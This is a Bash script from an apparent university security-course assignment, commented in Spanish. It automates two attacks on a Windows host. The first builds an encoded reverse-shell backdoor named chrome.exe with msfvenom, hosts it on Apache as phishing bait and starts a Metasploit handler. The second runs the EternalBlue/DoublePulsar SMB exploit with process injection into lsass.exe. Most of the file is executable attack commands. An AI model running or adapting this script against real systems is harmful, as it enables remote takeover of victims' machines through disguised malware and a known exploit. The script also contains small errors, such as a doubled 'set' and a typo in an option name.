#!/bin/bash
 ###########################################
#	Pontificia Universidad Javeriana Cali 	#
#	Ingenieria de Sistemas y Computacion 	#
#	Seguridad Informatica					#
#	Estudiante:								#
#		Santiago Florian Bustamante			#
#											#
#	20 de Septiembre del 2020				#
#	Tarea 2									#
 ###########################################

######################################################################
#	El siguiente sh contiene la solucion a la segunda terea de
#	Seguridad Informatica, de realizar un ataque de ingeniería social 
#	por medio de phishing.
#
#	Palablas clave: 
#	-	SO: Sistema Operativo
#	-	Backdoor: Puerta trasera, habilitar un puerto de la victima
#				para acceder a funciones de su maquina si su permiso
#	-	phishing: Pescar, accion de encontrar una victimia
#	-	Ingenieria Social: La ingeniería social es la práctica de
#				obtener información confidencial a través de la
#				manipulación de usuarios legítimos.
######################################################################

######################################################################
#	En esta actividad se debe realizar un ataque de Ingeniería social
#	usando la técnica de phishing, con la distribución de Kali Linux,
#	desde una máquina virtual a un ordenador con Windows. El primer
#	ataque se realizará instalando un Backdoor que permite tomar
#	control remotamente de la máquina, este tipo de ataque lo
#	llamaremos ataque activo de ingeniería social, el segundo ataque
#	consiste en aprovechar la vulnerabilidad publicada en el año 2017
#	del protocolo SMB en los sistemas Windows, a este segundo ataque
#	lo llamaremos ataque pasivo de Ingeniería social, en ambos ataques
#	utilizaremos las herramientas BeeF y Metasploit.
######################################################################

######################################################################
#	Ataque activo:
#		Como crear un backdoor:
#	Mediante el programa msfvenom se puede generar un backdoor llamado
#	como se desee, la mejor opcion es que su nombre sea igual a
# 	cualquier programa de ejecucion natural del SO como por ejemplo
#	chrome.exe que es igual al proceso que ejecuta el navegador web 
#	google chrome. 
#
	LHOST=$(hostname -I)	#Captura la direccion IP de mi maquina, la maquina la cual va a conectarse la victima
	LPORT=444				#Indica el puerto que va a enviar la informacion
	echo "IP LOCAL: "$LHOST" PUERTO: "$LPORT	#Muestra en pantalla la direccion IP y el puerto
	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o /var/www/html/chrome.exe
#	Genera chrome.exe y lo aloja en la carpeta html del servidor apache2	
#
	service apache2 start	#Inicia el servidor apache2
#	
#	Crea el script que se ejecutara en metasplot	
#
	touch sploit.flo 	#Genera el fichero que tendra el sploit a ejecutar por metasploit
	echo "use exploit/multi/handler" 					>> sploit.flo
	echo "set payload windows/meterpreter/reverse_tcp" 	>> sploit.flo
	echo "set LHOST "$LHOST 							>> sploit.flo
	echo "set LPORT "$LPORT								>> sploit.flo
	echo "exploit" 										>> sploit.flo

	more sploit.flo 	#Muestra en pantalla el escript que se va a ejecutar
#
#	Ejecutamos la consola de Metasploit en conjunto con el fichero que
# 	tiene las instrucciones para metasploit
#
	msfconsole -r sploit.flo
#	
#	Borra los archivos creados durante el laboratorio
	rm /tmp/chrome.exe
	rm /var/www/html/chrome.exe
	rm sploit.flo
######################################################################

######################################################################
#	Ataque pasivo:
#
#
	RHOST=192.168.1.1	#Direccion IP de la victima
	touch sploit.flo 	#Genera el fichero que tendra el sploit a ejecutar por metasploit
	echo "use exploit/windows/smb/eternalblue_doublepulsar"	>> sploit.flo
	echo "set RHOST "$RHOST 								>> sploit.flo
	echo "set TARGETARCHITECHTURE x86" 						>> sploit.flo
	echo "set PROCESSINJECT lsass.exe" 						>> sploit.flo
	echo "set set TARJET 7"									>> sploit.flo
	echo "set payload windows/x86/meterpreter/reverse_tcp"	>> sploit.flo
	echo "exploit" 											>> sploit.flo 
#
	msfconsole -r sploit.flo
	rm sploit.flo
#
######################################################################